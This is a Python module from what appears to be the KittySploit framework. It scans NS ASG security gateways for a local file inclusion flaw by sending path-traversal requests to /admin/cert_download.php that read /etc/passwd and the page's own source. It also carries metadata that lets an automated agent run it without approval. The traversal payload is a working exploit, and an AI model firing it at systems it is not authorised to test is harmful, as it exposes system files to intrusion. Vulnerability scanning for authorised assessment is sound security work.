#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NS ASG is vulnerable to local file inclusion."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NS ASG - Local File Inclusion Detection',
        'description': 'NS ASG is vulnerable to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'nsasg', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://zhuanlan.zhihu.com/p/368054963',
            'http://wiki.xypbk.com/Web安全/网康%20NS-ASG安全网关/网康%20NS-ASG安全网关%20任意文件读取漏洞.md',
        ],
    }

    def run(self):
        for path in ('/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd', '/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('$certfile', 'application/pdf',)
            body_regexes = ('root:.*:0:0:',)
            if (all(m in body for m in body_all)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="NS ASG - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

